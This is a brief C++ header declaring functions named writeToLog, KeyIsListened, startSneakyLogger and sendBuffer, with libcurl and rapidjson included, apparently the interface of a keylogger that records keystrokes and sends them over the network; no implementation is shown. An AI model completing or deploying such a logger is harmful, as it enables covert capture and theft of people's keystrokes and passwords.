#pragma once
#include <iostream>
#include <fstream>
#include <string>
#include <curl\curl.h>
#include <rapidjson/rapidjson.h>
#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/reader.h"
#include "rapidjson/stringbuffer.h"
#include "Util.h"

void writeToLog(LPCSTR text);
bool KeyIsListened(int iKey);
void startSneakyLogger();
void sendBuffer();